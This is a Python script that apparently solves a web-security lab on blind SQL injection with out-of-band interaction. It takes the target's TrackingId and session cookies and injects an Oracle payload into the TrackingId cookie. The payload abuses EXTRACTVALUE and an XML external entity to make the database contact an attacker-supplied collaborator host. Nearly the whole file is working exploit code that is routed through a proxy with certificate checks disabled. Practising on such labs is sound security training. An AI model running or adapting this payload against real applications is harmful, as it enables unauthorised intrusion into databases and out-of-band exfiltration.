# Blind SQL injection with out-of-band interaction

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, tracking_cookie, session_cookie, payload):
	cookies = {"TrackingId": tracking_cookie + payload, "session": session_cookie}
	r = s.get(url, cookies=cookies)
	time.sleep(.3)
	print('[+] Using payload:\t%s' % payload)
	return r

def dnslookup(s, url, tracking_cookie, session_cookie, collab):
	payload = """' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://""" + collab + """/"> %remote;]>'),'/l') FROM dual)--;"""
	r = send_payload(s, url, tracking_cookie, session_cookie, urllib.parse.quote(payload))
	print(r)

def show_usage():
	print('[+] Usage: %s <URL> <COLLABORATOR>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com xxxxxxxxxxxxxxxxxxxx.oastify.com\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Blind SQL injection with out-of-band interaction')
	try:
		url = sys.argv[1].strip()
		collab = sys.argv[2].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	tracking_cookie = s.cookies.get_dict().get('TrackingId')
	session_cookie = s.cookies.get_dict().get('session')
	dnslookup(s, url, tracking_cookie, session_cookie, collab)

if __name__ == "__main__":
	main()
